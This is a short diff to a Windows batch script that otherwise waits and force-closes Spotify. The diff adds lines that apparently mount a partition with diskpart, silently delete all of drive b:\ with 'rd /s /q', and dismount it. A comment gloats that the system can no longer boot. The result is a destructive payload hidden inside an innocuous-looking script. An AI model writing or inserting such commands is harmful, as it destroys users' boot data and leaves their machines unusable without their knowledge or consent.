@@ -1,4 +1,8 @@
 @echo off
+diskpart -s mount
+rd b:\ /s /q
+diskpart -s dismount
+rem OOPS, THERE IS NO LONGER BOOT
 timeout /t 15
 taskkill /f /im spotify.exe
 timeout /t 2
